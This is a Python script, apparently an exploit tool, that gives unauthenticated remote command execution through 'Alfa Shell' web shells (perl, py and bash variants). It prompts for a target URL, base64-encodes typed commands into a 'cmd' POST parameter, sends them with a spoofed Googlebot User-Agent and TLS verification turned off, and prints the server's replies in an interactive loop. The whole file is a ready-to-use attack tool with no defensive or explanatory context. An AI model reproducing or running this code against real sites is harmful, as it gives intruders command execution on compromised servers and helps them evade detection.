import requests
import base64
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init

init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
WHITE = Fore.WHITE
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

warnings.simplefilter('ignore', InsecureRequestWarning)

def execute_command(url, command):
    try:
        encoded_command = base64.b64encode(command.encode()).decode()
        encoded_check = base64.b64encode(b"").decode()

        data = {
            "cmd": encoded_command,
            "check": encoded_check
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        }

        print(f"{RESET}[*] Sending command: {GREEN}{command}{RESET}")
        response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)

        if response.status_code == 200:
            print(f"{GREEN}[*] Command executed successfully.{RESET}")
            print(response.text)
        else:
            print(f"{RED}[*] HTTP Status Code: {response.status_code}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[*] Request failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[*] {e}{RESET}")

def main():
    print(f"{YELLOW}Alfa Shell Unauthenticated Remote Code Execution (perl.alfa, py.alfa, bash.alfa){RESET}")
    
    try:
        # Input target URL
        target_url = input(f"{GREEN}Enter the target URL: {RESET}")
        if not target_url.startswith("http"):
            print(f"{RED}[*] Invalid URL. Please include 'http://' or 'https://'.{RESET}")
            return

        print(f"{RESET}Target URL set to: {GREEN}{target_url}{RESET}")

        while True:
            command = input(f"{YELLOW}Enter command to execute (or 'exit' to quit): {RESET}")
            if command.lower() == "exit":
                print(f"{YELLOW}[*] Exiting...{RESET}")
                break
            execute_command(target_url, command)

    except ValueError:
        print(f"{RED}[*] Invalid input. Please enter a valid URL.{RESET}")

if __name__ == "__main__":
    main()
